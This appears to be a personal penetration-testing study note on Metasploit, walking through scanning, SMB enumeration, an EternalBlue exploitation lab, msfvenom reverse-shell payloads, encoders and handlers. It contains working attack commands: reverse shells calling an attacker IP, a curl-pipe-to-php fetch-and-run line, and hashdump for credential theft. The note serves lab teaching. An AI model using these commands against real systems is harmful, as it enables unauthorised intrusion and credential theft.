```yml
date: 2025-09-15  
author: Sameer Saini  
reason: 0x45
title: Metasploit — Deep Notes
tags: [metasploit, pentest, exploit, notes]
```

---


## 1) Find a port scanner in `msfconsole`

```text
msf6 > search portscan
```

Typical result you might pick:

```
auxiliary/scanner/portscan/tcp
```

Load it:

```text
msf6 > use auxiliary/scanner/portscan/tcp
```

Show options:

```text
msf6 auxiliary(scanner/portscan/tcp) > show options
```

---

## 2) Important options explained

|Option|Purpose|Example / notes|
|---|--:|---|
|`CONCURRENCY`|How many hosts to attempt in parallel|`set CONCURRENCY 20` — faster but higher load & noise|
|`PORTS`|Ports / range to scan|`set PORTS 21-25,80,443,8000-8100`|
|`RHOSTS`|Target host(s) or network CIDR|`set RHOSTS 10.10.10.0/24` or `set RHOSTS 10.10.10.5`|
|`THREADS`|Number of worker threads used by the scanner|`set THREADS 10`|
|`TIMEOUT`|Packet timeout in seconds|`set TIMEOUT 5`|

Run it:

```text
set RHOSTS 10.10.10.0/24
set PORTS 1-65535
set THREADS 50
run
```

> [!tip] For noisy scans reduce CONCURRENCY/THREADS. For stealthier scans use smaller `PORTS` sets and longer `TIMEOUT`.

---

## 3) Use `nmap` inside `msfconsole`

You can call `nmap` from within Metasploit and optionally import results into the DB with `db_nmap`:

```text
# quick TCP SYN scan for top ports
db_nmap -sS --top-ports 100 10.10.10.5

# verbose + service/version detection + scripts for vuln detection
db_nmap -sV -sC -p 1-65535 10.10.10.5
```

`db_nmap` will automatically parse and insert hosts/services into the msf DB (view with `hosts` / `services` commands).

---

## 4) UDP service identification

UDP is noisy/slow; use targeted sweeps:

```text
# use the Metasploit UDP sweep module
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS 10.10.10.0/24
set PORTS 53,123,161,500
set THREADS 20
run
```

Or use nmap UDP scan (slower but powerful):

```bash
db_nmap -sU -p 53,123,161,500 10.10.10.5
```

---

## 5) SMB scanning (version / enumerations)

Metasploit has SMB scanners that enumerate version and shares:

```text
# check SMB version
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.5
set THREADS 10
run

# enumerate shares & sessions (when allowed)
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.5
run
```

After running these, check DB:

```text
hosts          # list discovered hosts
services       # list services collected
vulns          # list known vulns (if any)
```

---

# Metasploit Database (Postgres) — full workflow & commands

> [!note] DB makes large engagements manageable: persist scans, pivot between workspaces, query services/hosts.

### 1) Start Postgres & init msf DB

On a Kali-like system:

```bash
sudo systemctl start postgresql

# initialize Metasploit DB (creates DB, user, config)
sudo msfdb init
```

Check DB status in `msfconsole`:

```text
msf6 > db_status
```

Expected: `connected to msf6 database...`

---

### 2) Workspaces (multi-target projects)

List workspaces:

```text
msf6 > workspace
```

Create / delete / change:

```text
msf6 > workspace -a corpengagement      # add
msf6 > workspace -d old-engagement      # delete
msf6 > workspace corpengagement         # switch into workspace
```

All DB actions (e.g., `db_nmap`) now store into the selected workspace.

---

### 3) Scan + store (example full flow)

1. Select (or create) workspace:
    

```text
workspace -a smb-assessment
workspace smb-assessment
```

2. Run `db_nmap` to populate DB:
    

```text
db_nmap -sS -p 135,139,445,3389 --open 10.10.10.0/24
```

3. Check hosts & services:
    

```text
hosts
services
services -S smb   # show services filtered by name 'smb'
```

4. Use results to drive exploitation selection (filter by OS/service/version):
    

```text
services -S smb | grep 10.10.10.5         # quick grep example
```

---

# Vulnerability Scanning — practical snippet & tips

A real-world style flow (lab):

1. **Port discovery** — `db_nmap` or `auxiliary/scanner/portscan/tcp`
    
2. **Service/version detection** — `db_nmap -sV -sC` (or `nmap -sV --script=vuln`)
    
3. **Targeted vulnerability checks** — Metasploit modules or external scanners (Nessus, OpenVAS) — import results to DB
    
4. **Prioritize** by criticality: public-facing services, known CVEs, credentials reuse
    

Example `nmap` vuln scan inside msf:

```text
db_nmap -sV --script vuln 10.10.10.5
```

Then search for exploit modules matching the service:

```text
search type:exploit name:smb
search cve:2017-0144   # example search by CVE if you know it
```

---

# Exploitation — lab scenario (real-world style, step-by-step)

> Scenario: Target `10.10.10.5` has SMB open and `smb_version` reports a vulnerable version. You have permission to test.

### A. Recon & pick exploit

```text
# in msfconsole
workspace smb-assessment
db_nmap -sS -p 445 --open 10.10.10.5

# check smb info found in DB
services -S smb
```

Find exploit candidates:

```text
search type:exploit smb name:eternalblue
```

### B. Configure exploit + payload

```text
use exploit/windows/smb/ms17_010_eternalblue        # example module
show targets
set RHOSTS 10.10.10.5
set RPORT 445

# choose payload (staged vs single)
set PAYLOAD windows/x64/meterpreter_reverse_tcp

# listener settings
set LHOST 10.0.0.5      # attacker IP (lab)
set LPORT 4444
```

### C. Run exploit (and background handler if needed)

```text
exploit -j            # run as job (background); or just `exploit`
# or: use handler separately:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j
```

### D. After successful exploit

```text
sessions -l
sessions -i 1         # interact with session #1
# inside Meterpreter:
sysinfo
getuid
hashdump              # requires proper privileges and module availability
```

> [!important] Some exploit modules will automatically start a handler for you; others expect you to run `multi/handler` first. Read `show options` and module docs (`info`) to confirm behavior.

---

# `msfvenom` — full examples & common formats

List payloads and formats:

```bash
msfvenom -l payloads
msfvenom --list formats
```

### Example payload generation commands (lab)

Linux ELF payload:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o rev_shell.elf
```

Windows EXE payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o rev_shell.exe
```

PHP webshell (raw PHP code to drop into a PHP app in lab):

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > rev_shell.php
```

ASP payload:

```bash
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp > rev_shell.asp
```

Python reverse command (raw):

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw > rev_shell.py
```

---

## Encoders — basic usage

> Encoders are legacy obfuscation; modern EDRs often detect by behavior.

```bash
# encode with shikata_ga_nai 3 iterations (x86 example)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
```

---

# Handlers — catch the shell (step-by-step example)

1. Start a handler in `msfconsole`:
    

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.0.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

2. Deliver the payload to the target (lab):
    

- **Web delivery** (lab only): place `rev_shell.php` into a web root and trigger via browser/curl:
    

```bash
# on attacker machine: host the folder with the php file
python3 -m http.server 8000
# on target (lab) fetch it (if allowed in lab)
curl http://10.0.0.5:8000/rev_shell.php | php
```

3. Handler receives callback:
    

```text
msf6 > sessions -l
msf6 > sessions -i <id>
```

---

# Full pasteable lab scenario — end to end (condensed)

```text
# Start DB & workspace
sudo systemctl start postgresql
sudo msfdb init
msfconsole
workspace -a lab-scan
workspace lab-scan

# Fast port/service discovery, store in DB
db_nmap -sS -p 21,22,80,139,445,3306,3389 --open 10.10.10.5

# Check results
hosts
services

# SMB version + shares
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.5
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 10.10.10.5
run

# Find exploit
search type:exploit smb  # then pick a matched exploit

# Configure exploit
use exploit/windows/smb/EXAMPLE_MODULE
set RHOSTS 10.10.10.5
set RPORT 445
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444

# Start handler (in separate msfconsole tab/session or as background job)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST 10.0.0.5
set LPORT 4444
exploit -j

# Generate payload (attacker)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o /tmp/rev_shell.exe

# Deliver payload in lab (method depends on allowed vector)
# After execution on target, monitor handler and interact:
sessions -l
sessions -i 1
```


---
